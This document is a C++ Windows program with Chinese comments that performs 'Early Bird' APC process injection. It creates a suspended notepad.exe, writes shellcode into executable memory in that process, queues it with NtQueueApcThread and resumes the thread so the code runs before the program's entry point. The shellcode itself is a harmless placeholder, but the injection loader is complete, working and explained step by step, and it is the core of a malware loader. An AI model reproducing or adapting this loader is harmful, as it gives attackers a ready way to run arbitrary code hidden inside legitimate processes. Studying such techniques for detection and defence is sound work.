#include <windows.h>
#include <iostream>

// ============================================================
// Shellcode: mov eax, 42; ret
// ============================================================
unsigned char shellcode[] = {
    0xB8, 0x2A, 0x00, 0x00, 0x00,
    0xC3
};
SIZE_T shellcodeSize = sizeof(shellcode);

// ============================================================
// NtQueueApcThread 函数指针
// ============================================================
typedef NTSTATUS(NTAPI* pNtQueueApcThread)(
    HANDLE, PVOID, PVOID, PVOID, PVOID);

int main() {
    // ① 创建挂起进程
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // 这里用 notepad.exe 作为靶子（你可以换成 calc.exe 或 cmd.exe）
    if (!CreateProcessA(
            NULL,
            (LPSTR)"C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, FALSE,
            CREATE_SUSPENDED,   // 关键：挂起启动
            NULL, NULL,
            &si, &pi)) {
        std::cerr << "[-] CreateProcess 失败: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] 挂起进程创建成功，PID: " << pi.dwProcessId << std::endl;
    std::cout << "[+] 主线程 ID: " << pi.dwThreadId << std::endl;

    // ② 在目标进程申请内存，写入 Shellcode
    LPVOID pRemoteMem = VirtualAllocEx(
        pi.hProcess, NULL, shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    if (!pRemoteMem) {
        std::cerr << "[-] VirtualAllocEx 失败: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    if (!WriteProcessMemory(pi.hProcess, pRemoteMem, shellcode, shellcodeSize, NULL)) {
        std::cerr << "[-] WriteProcessMemory 失败: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    std::cout << "[+] Shellcode 写入: 0x"
              << std::hex << (uintptr_t)pRemoteMem << std::dec << std::endl;

    // ③ 拿到 NtQueueApcThread 地址
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)
        GetProcAddress(hNtdll, "NtQueueApcThread");
    if (!NtQueueApcThread) {
        std::cerr << "[-] 找不到 NtQueueApcThread" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // ④ 向主线程插入 APC（主线程句柄已经在 pi.hThread 里）
    NTSTATUS status = NtQueueApcThread(
        pi.hThread,
        (PVOID)pRemoteMem,
        NULL, NULL, NULL);
    if (status != 0) {
        std::cerr << "[-] NtQueueApcThread 失败: 0x"
                  << std::hex << status << std::dec << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    std::cout << "[+] APC 插入成功，准备恢复主线程..." << std::endl;

    // ⑤ 恢复主线程（Shellcode 会在入口点之前执行）
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        std::cerr << "[-] ResumeThread 失败: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    std::cout << "[+] 主线程已恢复，Early Bird 注入完成" << std::endl;

    // ⑥ 清理（注意：不要立即 TerminateProcess，让目标进程正常跑）
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    system("pause");
    return 0;
}